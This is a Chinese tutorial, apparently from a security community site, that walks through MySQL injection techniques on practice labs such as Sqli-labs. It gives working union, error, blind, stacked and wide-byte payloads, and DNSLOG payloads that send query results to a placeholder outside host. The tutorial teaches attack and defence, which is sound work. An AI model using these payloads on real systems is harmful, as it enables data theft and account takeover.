

# 奇安信攻防社区-SQL 注入精粹：从 0 到 1 的注入之路

### SQL 注入精粹：从 0 到 1 的注入之路

从客观角度来看，SQL 注入是因为前端输入控制不严格造成的漏洞，使得攻击者可以输入对后端数据库有危害的字符串或符号，使得后端数据库产生回显或执行命令，从而实现对于数据库或系统的入侵；从攻击者角度来看，需要拼接出可以使后端识别并响应的 SQL 命令，从而实现攻击

# 浅析 MYSQL 数据库 SQL 注入漏洞

## 什么是 SQL 注入

从客观角度来看，SQL 注入是因为前端输入控制不严格造成的漏洞，使得攻击者可以输入对后端数据库有危害的字符串或符号，使得后端数据库产生回显或执行命令，从而实现对于数据库或系统的入侵；从攻击者角度来看，需要拼接出可以使后端识别并响应的 SQL 命令，从而实现攻击

## RDBMS（关系型数据库）术语

这里仅说明与 SQL 注入相关的术语：

-   数据库：关联表的集合
-   数据表：表是数据的矩阵，看起来就像我们日常生活中的 Excel 表格
-   列：一列，包含了相同类型的数据
-   行：一行，一组相关的数据，比如一个用户所有维度的信息
    
    | ![](assets/1707473863-a7355e5d8acae3512af6e6b1668c9fd6.png)SQL 注入类型分类 |
    | --- |
    

从注入参数类型分：数字型注入、字符型注入  
从注入效果分：报错注入、无显盲注（布尔盲注、延时盲注）、联合注入、堆叠注入、宽字节注入、二次注入  
从提交方式分：GET 注入、POST 注入、HTTP 头注入（UA 注入、XFF 注入）、COOKIE 注入

## SQL 注入的常见位置

1.  URL 参数：攻击者可以在应用程序的 URL 参数中注入恶意 SQL 代码，例如在查询字符串或路径中
2.  表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标
3.  Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，攻击者可以通过修改 Cookie 中的值来进行 SQL 注入
4.  HTTP 头部：有些应用程序可能会从 HTTP 头部中获取数据，攻击者可以在 HTTP 头部中注入恶意 SQL 代码。
5.  数据库查询语句：在应用程序中直接拼接 SQL 查询语句的地方，如果没有正确地对用户输入进行过滤和转义，就可能导致 SQL 注入漏洞

## 如何判断是否存在 SQL 注入

-   单双引号判断
-   and 型判断
-   or 或 xor 判断
-   exp(709) exp(710)

# 联合注入

通过学习联合注入，我们可以习得 SQL 注入的思想和基础，联合注入一般分为以下七步：

## 第一步 - 类型判断

判断是否存在注入，若存在，则判断是字符型还是数字型，简单来说就是数字型不需要符号包裹，而字符型需要

数字型：`select * from table where id =$id`  
字符型：`select * from table where id='$id'`

判断类型一般可以使用 and 型结合永真式和永假式，判断数字型：

```php
1 and 1=1 #永真式   select * from table where id=1 and 1=1
1 and 1=2 #永假式   select * from table where id=1 and 1=2
#若永假式运行错误，则说明此 SQL 注入为数字型注入
```

判断字符型：

```php
1' and '1'='1
1' and '1'='2
#若永假式运行错误，则说明此 SQL 注入为字符型注入
```

## 第二步 - 查字段个数

使用`order by`查询字段个数，上一步我们已经判断出了是字符型还是数字型，也就是说我们已经构建出了一个基本的**框架（在初学 SQL 注入时“框架”的思想十分重要）**

这里我们用 Sqli-labs 第一关来详细解释一下框架思想，首先使用单引号进行测试，出现 SQL 语句报错，则此关为**字符型注入**  
![](assets/1707473863-35525945af90f29de609ecc45f1be6f7.png)  
之后引出了 SQL 注入的另外一个重要知识点，也就是注释的使用（可以确认有没有其他闭合字符），MySQL 提供了以下三种注释方法：

-   `#`：不建议直接使用，会被浏览器当做 URL 的书签，建议使用其 URL 编码形式`%23`
-   `--+`：本质上是`--空格`，`+`会被浏览器解释为空格，也可以使用 URL 编码形式\`\`--%20
-   `/**/`：多行注释，常被用作空格

这里我们使用`%23`将 SQL 语句后面的单引号注释掉，也就形成了我们的框架，后面的所有内容都是在框架里进行的，只会对框架做微调  
![](assets/1707473863-742996c2b9a759d985905449929f1a8a.png)  
之后我们在框架中使用`order by 数字`来查询字段的个数，这里的关键是找到**临界值**，例如`order by 4`时候还在报错，但是`order by 3`时没有出现报错，3 就是这里的临界值，说明这里存在 3 个字段  
![](assets/1707473863-f06d0928df3ffe326c61029ba0ff6982.png)

## 第三步 - 查找显示位

使用`union select`查找显示位，上一步我们已经知道了字段的具体个数，现在我们要判断这些字段的哪几个会在前端显示出来，这些显示出来的字段叫做显示位，我们使用`union select 1,2,3.....(字段个数是多少个就写到几)`来对位置的顺序进行判断（其中数字代表是几号显示位）

这里我们需要对框架做一下微调，也就是将 1 改为 -1，**这里修改的目的是查询一个不存在的 id，使得第一句为空，显示第二句的结果**，这里我们可以发现 1 号字段是在前端不显示的，2 号和 3 号字段在前端显示，所以是显示位  
![](assets/1707473863-cb5f46ed1ea482916ad018d48c84e6a1.png)

## 第四步 - 爆库名

使用`database()`函数爆出库名，`database()`函数主要是返回当前（默认）数据库的名称，这里我们把它用在哪个显示位上都可以  
![](assets/1707473863-fe361818f23335fc28b59478f82396c8.png)

## 第五步 - 爆表名

基于库名使用`table_name`爆出表名，先来介绍一下使用到的函数和数据源：

-   `group_concat()`函数：使数据在一列中输出
-   `information_schema.tables`数据源：存储了数据表的元数据信息，我们主要使用此项数据源中的`table_name`和`table_schema`字段

最终可以构造出 Payload 如下，可以获取到 emails，referers，uagents，users 四张表

```php
http://127.0.0.22/Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23
```

![](assets/1707473863-049ab88b0e467d24c49681c3ca2a0a20.png)

## 第六步 - 爆列名

基于表名使用`column_name`爆出列名，此时数据源为`information_schema.columns`，位置在`table_name='表名'(记得给表名加单引号)`

最终构造 Payload 如下，可以获取到 id，email\_id 两个字段

```php
http://127.0.0.22/Less-1/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails' %23
```

![](assets/1707473863-91c1ec6f6dc9402512a74774be816bbd.png)

## 第七步 - 爆信息

使用列名爆敏感信息，直接 from 表名即可，这里需要使用`group_concat(concat_ws())`实现数据的完整读取，`group_concat()`函数在前面几步就接触过，主要是使数据在一列中输出

这就带来了一个问题，如果直接把列放入`group_concat()`函数，列间的界限就不清晰了，`concat_ws()`就是为了区分列的界限所使用的，其语法如下：

```php
concat_ws('字符',字段1,字段2,.....)
```

最终我们便可以构造出获取数据的 Payload：

```php
http://127.0.0.22/Less-1/?id=-1'union select 1,2,group_concat(concat_ws('-',id,email_id)) from emails %23
```

![](assets/1707473863-734ff03abd89805f21e0b56e48fbaaee.png)

# 报错注入

报错注入的本质是使用一些指定的函数制造报错，从而从报错信息获得我们想要的内容，使用前提是**后台没有屏蔽数据库的报错信息，且报错信息会返回到前端，报错注入一般在无法确定显示位的时候使用**，我们先来了解一下报错注入的类型和会用到的函数

## XPath 导致的报错

`updatexml()`函数和`extractvalue()`函数都可以归类为是 XPath 格式不正确或缺失导致报错的函数

### updatexml() 函数

`updatexml()`函数本身是改变 XML 文档中符合条件的值，其语法如下：

```php
updatexml(XML_document,XPath_string,new_value)
```

语法中使用到以下三个参数

-   XML\_document：XML 文档名称，使用 String 格式作为参数
-   XPath\_string：路径，XPath 格式，`updatexml()`函数如果**这项参数错误便会导致报错，我们主要利用的也是这个参数**
-   new\_value：替换后的值，使用 String 格式作为参数

### extractvalue() 函数

`extractvalue()`函数本身用于在 XML 文档中查询指定字符，语法如下：

```php
extractvalue(XML_document,xpath_string)
```

语法中使用到以下两个参数

-   XML\_document：XML 文档名称，使用 String 格式作为参数
-   XPath\_string：路径，XPath 格式，`extractvalue()`函数也在这里产生报错

## 主键重复导致的报错

主键报错注入是由于`rand()`，`count()` ，`floor()`三个函数和一个`group by`语句联合使用造成的，缺一不可

### rand() 函数

`rand()`函数的基础语法是这样的，它的参数被叫做 seed(种子)，当种子为空的时候，`rand()`函数会返回一个`[0,1)`范围内的随机数，当种子为一个数值时，则会返回一个可复现的随机数序列

```php
rand(seed)
```

如果还不能理解种子的概念，我来说一个种子在其他领域的应用，我的世界这款游戏大家应该不陌生，在创建世界的时候，可以使用种子来指定固定的世界类型  
![](assets/1707473863-14a100bea78ac9758e843e2ed83c7340.png)  
例如`-1834063422`这个种子生成的世界一定是包含废弃村庄的世界  
![](assets/1707473863-990752c38a47032104f760e86af595e3.webp)  
在 Mysql 中也是这样的，只要输入种子，一定返回一个可复现的随机数序列，这里还有一个小细节，**种子是只取整数部分的，使用小数点后第一位进行四舍五入取整**

使用`Select rand(seed) FROM users;`查询语句进行测试，验证一下上面的结论  
![](assets/1707473863-e98a213c3b870cd417d5a9434775b0a0.png)

至此，我们可以看出，`seed()`函数存在种子时，是伪随机的，这里的“伪”是有规律的意思，代表计算机产生的数字即是随机的也是有规律的

### floor() 函数

`floor()`函数的作用就是返回小于等于括号内该值的最大整数，也就是取整，它这里的取整不是进行四舍五入，而是**直接留下整数位，去掉小数位，如果是负数则整数位需要加一**  
![](assets/1707473863-9227d31b910c7e99c874a88725e28ed4.png)

### count() 函数

`count()`是聚合函数的一种，是 SQL 的基础函数，除此以外，还有`sum()`、`avg()`、`min()`、`max()`等聚合函数，语法如下

```sql
select count(字段) from 表名; --得到该列值的非空值的行数

select count(*) from 表名; --用于统计整个表的行数
```

### group by 语句

`group by`语句的用法如下，它用于结合聚合函数，根据一个或多个列对结果集进行分组

```php
group by 列名;
```

这里举个例子方便大家理解，创建一个名为`users`的表，表的构成如下图  
![](assets/1707473863-db0e6856f5de9a9a13dd2b55e10daf2c.png)

我想知道在所有用户中，不同等级的各有多少人，我们便可以构造 SQL 语句如下

```sql
-- 选择 "level" 列和行数（由 COUNT(*) 计算）
SELECT level, COUNT(*)
-- 从 "users" 表中选择数据
FROM users
-- 按 "level" 列的值分组数据
GROUP BY level;
```

最终查询出不同等级的用户分别有多少人  
![](assets/1707473863-6976897c3a78a30ab1648b466415d22c.png)

这里我们借这个例子深入一下它的工作原理，`group by`语句在执行时，会依次查出表中的记录并创建一个临时表（这个临时表是不可见的），`group by`的对象便是该临时表的主键（level），如果临时表中已经存在该主键，则将值加 1，如果不存在，则将该主键**插入**到临时表中  
这里我们逐步模拟临时表的流程，最终可以发现与我们使用 SQL 语句得出的结果一致  
![](assets/1707473863-c206978c0fe01db8168a936b6aaf5242.png)

### 报错原因分析

`floor()`报错注入是利用下方这个相对固定的语句格式，导致的数据库报错

```sql
select count(*),(floor(rand(0)*2)) x from users group by x
```

我们先来分析`(floor(rand(0)*2))`在 SQL 语句中的含义，我们先来看它的内层`rand(0)*2`，以 0 为种子使用`send()`函数生成随机数序列，并且将数列中的每一项结果乘以 2  
![](assets/1707473863-15360b34dcf2bfba21799f95e06f81dc.png)  
再将乘以 2 后的结果放入`floor()`函数取整，最后得出伪随机数列如下，因为使用了固定的随机数种子 0，他每次产生的随机数列的前六位都是相同的 0 1 1 0 1 1 的顺序  
![](assets/1707473863-0c5e1e501e0187d8ed21b8a76442687d.png)

这时我们思考一个问题，基于上面`group by`语句的工作原理，我们可以知道，主键重复了就会使`count(*)`的值加 1，最终只是`count(*)`的值不同，那为什么说是主键重复导致的报错呢？

其实是这里有一个细节没有介绍，当`group by`语句与`rand()`函数一起使用时，Mysql 会建立一张临时表，这张临时表有两个字段，一个是主键，一个是`count(*)`，此时临时表无任何值，Mysql 先计算`group by`后面的值，也就是`floor()`函数（它们之间是以`x`作为媒介传递的），**如果此时临时表中没有该主键，则在插入前`rand()`函数会再计算一次**

上面提到固定序列的第一个值为 0，Mysql 查询临时表，发现没有主键为 0 的记录，因此将此数据插入，这时因为**临时表中没有该主键**，Mysql 插入的过程中还会计算一次`group by`后面的值，也就是`floor()`函数，但是此时`floor()`函数的结果为固定序列的第二个值，因此插入的主键为 1，`count(*)`也为 1

如果以上内容大家有点绕，可以简单理解为 **Mysql 的动作有两步，第一步是判断是否存在，第二步是插入数据，每步都需要`rand()`函数计算一次，并最终通过`floor()`函数输出结果（这种情况只在主键不存在时发生）**  
![](assets/1707473863-47f4907a1b3643952a33625c05906293.png)  
紧接着 Mysql 会继续查询下一条数据，若发现重复的主键，则`count(*)`加 1，若没有找到主键，则添加新主键，此时遍历的是`users`表中的第二行，`floor()`函数的值是固定数列的第三项为 1，主键重复，`count(*)`加 1  
![](assets/1707473863-e1568f14890d3be97d1b1b9bcaf736a5.png)  
此时我们来到了报错的关键点，此时遍历`users`表中的第三行，`floor()`函数的值是固定数列的第四项为 0，**此时不存在该主键，则需要进行刚才的两步走，做判断用的是固定数列的第四项为 0，插入时应用到固定数列的第五项为 1，此时 1 被当做一个新的主键插入到临时表中，则产生了主键重复错误**  
![](assets/1707473863-3022be7259d8e085c0dc94f23953b848.png)

### Payload 优化

由上面的原理可见，利用`floor(rand(0)*2)`产生报错需要数据表里至少存在 3 条记录，我们可以再极限一点，使用`floor(rand(14)*2)`，即可在存在 2 条记录的时候使用了  
![](assets/1707473863-1c8cd0d2618cb4b4d942505615748069.png)  
其原理如下，在第二条第二步时再次使用 0 当做主键插入导致主键重复报错  
![](assets/1707473863-4935b0d347f82e207b5994d3595f1158.png)

## 数据溢出导致的报错

### exp() 函数

MySQL 中的`exp()`函数用于将 e 提升为指定数字 x 的幂，也就是 $e^{x}$

```php
exp(x)
```

例如`exp(2)`就是 $e^{2}$  
![](assets/1707473863-28fd0da418cda6757a61723b6055ce34.png)  
我们可用利用 Mysql Double 数值范围有限的特性构造报错，一旦结果超过范围，`exp()`函数就会报错，这个分界点就是 709，当`exp()`函数中的数字超过 709 时就会产生报错  
![](assets/1707473863-25512d9ac8e4f0202f620516b0ed3050.png)

当 MySQL 版本大于 5.5.53 时，`exp()`函数报错无法返回查询结果，只会得到一个报错，所以在真实环境中使用它做注入局限性还是比较大的，但是可以用判断是否存在 SQL 注入

### pow() 函数

MySQL 中的`pow()`函数用于将 x(基数) 提升为 y(指数) 的幂，也就是 $x^{y}$，语法如下

```php
pow(x,y)
```

报错原理和`exp()`函数一样，超出了 Mysql Double 数值的范围，导致报错  
![](assets/1707473863-c056618bc687db7f6767fdfcf31f4b73.png)

## 空间数据类型导致的错误

这类报错因为 Mysql 版本限制导致用的比较少，这里列出来，大家有兴趣的话可以做一下深入研究，简单来说，这类函数报错的原因是**函数对参数要求是形如（1 2,3 3,2 2 1）这样几何数据，如果不满足要求，则会报错**，可以产生报错的函数如下：

```php
geometrycollection()
multiponint()
polygon()
multipolygon()
linestring()
multilinestring()
```

# 无显注入（盲注）

无显注入适用于无法直接从页面上看到注入语句的执行结果，甚至连注入语句是否执行都无从得知的情况，这种情况我们就要利用一些特性和函数**自己创造判断条件**

## 基于布尔的盲注

在介绍布尔盲注的原理前，先来了解一下它用到的函数

### 常用函数

-   `left()`函数：从左边截取指定长度的字符串
    
    ```php
    left(指定字符串，截取长度)
    ```
    
-   `length()`函数：获取指定字符串的长度
    
    ```php
    length(指定字符串)
    ```
    
-   `substr()`函数和`mid()`函数：截取字符串，可以指定起始位置（从 1 开始计算）和长度
    
    ```php
    substr(字符串，起始位置，截取长度)
    mid(字符串，起始位置，截取长度)
    ```
    
-   `ascii()`函数：将指定字符串进行 ascii 编码
    
    ```php
    ascii(指定字符串)
    ```
    

### 布尔盲注原理

布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断，这里我们用 Sqli-labs 第八关帮助大家理解它  
先添加参数`?id=1`  
![](assets/1707473863-f4bb469b41b83e28dab90c095a5a279f.png)

先用单引号判断类型，发现添加单引号后并没有报错，但是 You are in... 消失了，这里也就为我们判断创造了条件，**后面我们就需要观察 You are in... 是否出现，找不同情况**  
![](assets/1707473863-adca5505dcc8cb2c079a99fd4add7689.png)

这里我们再添加一个单引号，发现 You are in... 出现，则本关为字符型注入，使用单引号包裹  
![](assets/1707473863-3bcb33a573f9194e4c02e7dd8c101b5a.png)

因为这里只会回显真或假，无法直接拿到数据库的名字，但是我们可以降低一点条件，可以**先判断出数据库名的长度（最长为 30），这里可以先给一个范围，观察一下回显（二分法）**

```php
//先猜测数据库名是否比 5 长，发现为真
1' and length(database())>5--+

//再判断数据库是否比 10 长，发现为假
1' and length(database())>10--+

//此时数据库大于 5 小于等于 10，依次尝试可以发现长度为 8
1' and length(database())=8--+
```

拿到长度后，我们使用`substr()`函数或`mid()`函数一位一位的猜测数据库字符，Mysql 库名一共可以使用 63 个字符，分别是：`a-z`、`A-Z`、`0-9`、`_`  
![](assets/1707473863-ddc84e8c1f15ba8469acd33fd10e9da1.png)

这里我们先来判断第一位是什么字符，这里我们使用 Burp Suite Intruder 模块快速进行，将字符标记为 Payload 设置字典为 `a-z`、`A-Z`、`0-9`、`_`，发现 s 和 S 回显长度与其他字符不同，说明这里第一位是 s，这里大小写都有是**因为 Mysql 在 Windows 下对大小写不敏感**

> MySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写，由`lower_case_file_system`和`lower_case_table_names`两个参数控制

![](assets/1707473863-94471ecdfe0b43c6e227ca634c603805.png)  
这里还可以进阶一下，使用集束炸弹模式，将字符位置设置为 Payload 1，字符内容设置为 Payload 2，实现一次爆破出所有字符  
![](assets/1707473863-1037a806c95111ba531f753ab5dc2eda.png)

我们对一到八位依次判断后可以发现库名为 security，这里还可以用`ascii()`函数和`substr()`函数嵌套或使用`left()`函数实现，但都没有直接用`substr()`函数 + Intruder 模块方便，这里就不再赘述  
之后我们使用`count()`函数来判断表的个数，这里依然可以使用 Intruder 模块，判断出有四个表  
![](assets/1707473863-6e2daff84350c402b983087dc4b24292.png)

个数清晰后再来判断每个表名的长度，这里使用了`limit`方法，语法如下

```php
limit N,M   //从第 N 条记录开始，返回 M 条记录
```

这里依次判断表的长度：

```php
第一个表长度为6
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+

第二个表长度为8
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+

第三个表长度为7
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 2,1))=7 --+

第四个表长度为5
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=5 --+
```

知道每个表的长度后，我们再使用和库名一样的方式猜解表名  
![](assets/1707473863-56e03fea59bd42a64b3c307929faee94.png)  
例如第一个表名称为 emails  
![](assets/1707473863-6ff9dbcbd4bd82a93c483adaf534c416.png)  
知道表（第四个表，长度为五，是 users）的信息后，我们再来猜列的个数，这里可以看到有三个列

```php
?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+
```

![](assets/1707473863-7939481e2619c4f29a94dd89bf3ae14c.png)  
再来判断每个列的长度

```php
第一个列长度为2
?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+

第二个列长度为8
?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+

第三个列长度为8
?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 2,1))=8 --+
```

再用同样的方法猜解列的名字，这里以第二个列为例，列名为 username  
![](assets/1707473863-f533e6662d285d0ed0cbac8df08e965f.png)  
下面还是如法炮制，判断列中有多少数据，我们可以使用`count(*)`

```php
?id=1' and (select count(*) from users)=13 --+
```

![](assets/1707473863-61438d444a4f1f0275f4d358b0e82d56.png)  
之后再来判断每条数据的长度

```php
第一个数据长度为4
?id=1' and length((select username from users limit 0,1))=4  --+

第二个数据长度为8
?id=1' and length((select username from users limit 1,1))=8  --+

第三个数据长度为5
?id=1' and length((select username from users limit 2,1))=5  --+

...

第十三个数据长度为6
?id=1' and length((select username from users limit 12,1))=6  --+
```

再用同样的方法猜解数据的内容，这里以第一个数据为例，数据内容为 dumb  
![](assets/1707473863-9971effd450ed60a8f494e12d6ebe5f7.png)  
至此布尔盲注的原理变得清晰，我们可以用一张导图来总结  
![](assets/1707473863-de13698d7ef9efe61203b699a150a116.png)

## 基于时间的盲注

时间盲注可以用在比布尔盲注过滤还要严格的环境中，当页面连真和假这个判断条件都不提供时，我们便可以让我们自己创造时间这一条件，**当语句被执行时，便会产生延迟，反之则不会**，我们先来看一下时间盲注的常用函数

### 常用函数

-   `sleep()`函数：将程序执行的结果延迟返回 n 秒
    
    ```php
    sleep(n)
    ```
    
-   `if()`函数：参数 1 为条件，当参数 1 返回的结果为 true 时，执行参数 2，否则执行参数 3，有点像 Java 里的三元运算符
    
    ```php
    if(参数 1，参数 2，参数 3)
    ```
    

### 延时盲注原理

延时盲注的实现本质上就是`if()`函数嵌套`sleep()`函数的综合利用，将`sleep()`函数作为`if()`函数的第二个参数，也就是当参数一被成功执行时（结果为 true）对返回结果执行延时，反之则执行参数三的直接回显  
![](assets/1707473863-afa4a312ba7646851cb8a0830be53dc0.png)

这里我们用 Sqli-labs 第九关帮助大家理解它，先尝试进行闭合，可以发现无论使用什么符号都是显示一样的内容，再使用`sleep()`函数进行辅助判断，可以发现当满足闭合条件时，页面会延迟回显

```php
?id=1' and sleep(5) --+ //满足闭合条件，页面延迟回显
?id=1' and sleep(5) //不满足闭合条件，页面直接回显
```

我们可以使用浏览器的【网络】功能进行更直观的判断，当我们不满足闭合条件时，延迟为 108 毫秒  
![](assets/1707473863-52d3089bbfc07a43b02205d104345a6c.png)  
当满足闭合条件时，可以看到延迟增加了五秒  
![](assets/1707473863-8debdf949ef4554e20033d2f31e2bc43.png)  
先获取一下库长度，当长度为 8 时，会延迟 5 秒执行，所以可以确定库长度为 8

```php
?id=1' and if(length(database())=8,sleep(5),1)--+
```

![](assets/1707473863-201d47a8ef2eeea0b5fed81840cf168e.png)  
下面再来判断库名，为了方便观察将延时时间调为 15 秒，这步如果手工测试效率会非常低，我们依然是使用 Intruder 模块

```php
?id=1' and if(substr(database(),1,1)='a',sleep(15),1)--+
```

这里爆破后我们点击最上方的列（Columns）功能，增加一个响应完成时间的维度，时间长的便是正确的字符，表名、字段名、数据内容猜解原理与表名相同，这里就不再赘述  
![](assets/1707473863-64fbefc04b27eb52c5b04470f6a8b8f0.png)

## 基于 DNSLOG 的注入

DNSLOG 是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。像是 SQL 盲注、命令执行、SSRF 及 XSS 等攻击但无法看到回显结果时，就会用到 DNSLOG 技术，相比布尔盲注和时间盲注，DNSLOG 减少了发送的请求数，可以直接回显，也就降低了被安全设备拦截的可能性

DNSLOG 注入优点众多，但利用条件也较为严苛

-   只支持 Windows 系统的服务端，因为要使用 UNC 路径这一特性，Linux 不具备此特性
-   Mysql 支持使用`load_file()`函数读取任意盘的文件 ### UNC 路径

UNC 全称 Universal Naming Convention，译为通用命名规范，例如我们在使用虚拟机的共享文件功能时，便会使用到 UNC 这一特性  
![](assets/1707473863-8e91c90b16c0809b17862ccf9a7e4e15.png)

UNC 路径的格式如下：

```php
\\192.168.0.1\test\
```

这里我们使用运行使用 UNC 路径访问`www.dnslog.cn`，并使用 wireshark 抓包，可以看到确实存在对`www.dnslog.cn`这个域名进行 DNS 请求的流量，但是并不会在浏览器直接打开网站  
![](assets/1707473863-f28ab3dfb97ad8c1382e1718dac8d068.png)

### load\_file() 函数

上文我们提到，`load_file()`函数可以读取**任意**盘的文件才可以使用 DNSLOG 注入，它的读取范围由 Mysql 配置文件`my.ini`中的`secure_file_priv`参数决定

-   当`secure_file_priv`为空，就可以读取磁盘的目录
-   当`secure_file_priv`为`G:\`，就可以读取 G 盘的文件
-   当`secure_file_priv`为 null，`load_file()`函数就不能加载文件（null 和空是两种情况） ### DNSLOG 盲注原理

先给出最常用的两种 Payload

```php
Payload 1:
and if((select load_file(concat('//',(select 攻击语句),'.xxxx.ceye.io/sql_test'))),1,0)

Payload 2:
and if((select load_file(concat('\\\\',(select 攻击语句),'.xxxx.ceye.io\\sql_test'))),1,0)
```

Payload 1,2 大体的思路都是一样的，也就是在`if()`函数中嵌套`load_file()`函数再使用 UNC 路径进行读取，`sql_test`这里写什么都可以，只是为了符合`load_file()`函数格式，读取时会产生 DNS 访问信息，唯一的不同点在于 Payload 2 在 URL 中使用`\(反斜杠)`时要双写配合转义

> 转义：转义是一种引用单个字符的方法。一个前面放上转义符 () 的字符就是告诉 shell 这个字符按照字面的意思进行解释

这里使用 Pikachu 靶场的时间盲注关卡进行演示，方便大家进行理解，在测试前一定先要确保`secure_file_priv`选项为空，可以使用`show variables like '%secure%';`进行查询  
![](assets/1707473863-41c4c902b5a23c156c9f6c0f250f1587.png)  
在修改`my.ini`文件时需要注意`secure_file_priv`选项是新增的，本身并没有这个选项  
![](assets/1707473863-ac7815fb85817370ef538dbe39a9cf63.png)  
通过判断可以发现是单引号闭合，先爆出库名，可以通过 DNSLOG 平台看到库名为 pikachu  
![](assets/1707473863-dd7a5168646284b960af2d2d4d22c5a4.png)  
这里还可以使用`hex()`函数，将回显内容编码为十六进制，这样做的好处是，假设回显内容存在特殊字符`!@#$%^&`，包含特殊字符的域名无法被解析，DNSLOG 也就无法记录信息，进行编码后就不存在这个问题  
![](assets/1707473863-602897bddd43106aa8783ee3143d9856.png)

后面整体的思路和联合查询基本一致，只是利用 DNSLOG 创造了回显的条件，这里不再赘述

# 堆叠注入

堆叠注入的基本原理是在一条 SQL 语句结束后（通常使用分号`;`标记结束），继续构造并执行下一条 SQL 语句，这种注入方法可以执行任意类型的语句，包括查询、插入、更新和删除等等

与联合注入相比，**堆叠注入最明显的差别便是它的权限更大了**，例如使用联合注入时，后端使用的是 select 语句，那么我们注入时也只能执行 select 操作，而堆叠查询是一条新的 SQL 语句，不受上一句的语法限制，操作的权限也就更大了

但相应的，堆叠注入的利用条件变得更加严格，例如在 Mysql 中，需要使用`mysqli_multi_query()`函数才可以进行多条 SQL 语句同时执行，同时还需要网站对堆叠注入无过滤，因此在实战中堆叠注入还是较为少见的

下面我们用 Sqli-labs 第 38 关进行一下演示方便大家理解，先使用联合注入判断出列名有 id、username、password 三项，然后我们使用堆叠注入修改 admin 的密码（原密码为 admin），使用 update 方法构造 Payload 如下

```php
?id=1';update users set password='test123456' where username='admin';--+
```

再次查看数据库发现 admin 密码已被改为 test123456  
![](assets/1707473863-c6d68bc2de7472c062e6c95f07c44ba3.png)

# 宽字节注入

## 什么是宽/窄字节

当某字符的大小为一个字节时，称其字符为窄字节，当某字符的大小为两个或更多字节时，称其字符为宽字节，而且不同的字符编码方式和字符集对字符的大小有不同的影响

例如，在 ASCII 码中，一个英文字母（不分大小写）为一个字节，一个中文汉字为两个字节；在 UTF-8 编码中，一个英文字为一个字节，一个中文为三个字节；在 Unicode 编码中，一个英文为一个字节，一个中文为两个字节

## 敏感函数 & 选项

-   `addslashes()`函数：返回在预定义字符之前添加反斜杠的字符串
-   `magic_quotes_gpc`选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL 等字符前加入转义字符`\`，在高版本 PHP 中（>=5.4.0）已经弃用
-   `mysql_real_escape_string()`函数：函数转义 SQL 语句中使用的字符串中的特殊字符
-   | `mysql_escape_string()`函数：和`mysql_real_escape_string()`函数基本一致，差别在于不接受连接参数，也不管当前字符集设定 宽字节注入原理 |
    | --- |
    

宽字节注入的本质是开发者设置**数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入**，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入

为了防止 SQL 注入，通常会使用一些 PHP 函数，如`addslashes()`函数，来对特殊字符进行转义（我们之前说过，转义就是在字符前加一个`\`），反斜杠用 URL 编码表示是`%5c`，所以如果我们输入单引号`’`，它会变成`%5c%27`，这样我们就无法闭合 SQL 语句了  
![](assets/1707473863-3484f973fb7767b2c962ca41443e9ad3.png)  
但是，如果我们输入`%df’`，它会变成`%df%5c%27`，这里，%df%5c 是一个宽字节的 GBK 编码，它表示一个繁体字“運”  
![](assets/1707473863-4ca08976d0fe8dbb23643e3629da191d.png)

因为 GBK 编码的第一个字节的范围是 129-254，而`%df`的十进制是 223，所以它属于 GBK 编码的第一个字节，而`%5c`的十进制是 92，它属于 GBK 编码的第二个字节的范围 64-254，所以，`%df%5c`被数据库解析为一个汉字，而不是两个英文字符  
这里我们用 Sqli-Labs 第 32 关进行演示方便大家理解，标题为 Bypass addslashes()，也就是说使用了`addslashes()`函数，先使用单引号判断闭合，发现单引号被转义  
![](assets/1707473863-1da4bce90f1d0ed2015b9dfbf5a12632.png)

这里我们白盒审计发现编码类型为 GBK

```php
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

固采用宽字节绕过，构造 Payload 如下  
![](assets/1707473863-6e4dc74f43d5cd45f7907515166e00bd.png)  
这里后面再加一个单引号也无法闭合，因为会再次触发转义机制，这里直接注释掉后面的内容即可，至此框架已经形成，后面基本思想与联合注入一致，这里就不再赘述  
![](assets/1707473863-60aaa732ee546588b6418aedc3a89f0d.png)

# 二次注入

二次注入和上述的注入方式相比技术含量没有这么高，主要是在于**对于注入点的运用**，需要运用两个及以上的注入点进行攻击

## 二次注入原理

这里假设有 A 和 B 两个注入点，**A 注入点因为存在过滤处理所以无法直接进行注入，但是会将我们输入的数据以原本的形式储存在数据库中（存入数据库时被还原了），在此情况下，我们找到注入点 B，使得后端调用存储在数据库中的恶意数据并执行 SQL 查询**，完成二次注入

这也就引出了二次注入的两个步骤

-   插入恶意数据：构造恶意语句并进行数据库插入数据时，虽对其中特殊字符进行了转义处理，但在写入数据库时仍保留了原来的数据
-   调用恶意数据：开发者默认存入数据库的数据都是安全的，在进行调用时，直接使用恶意数据，没有进行二次校验

这里我们用 Sqli-Labs 第 24 关进行演示方便大家理解，打开靶场可以看到是一个登录/注册页面  
![](assets/1707473863-28b3973bde6f676313473b6d5077d9c2.png)

这里我们先对注册页面进行白盒审计，发现使用`mysql_escape_string()`函数进行转义

```php
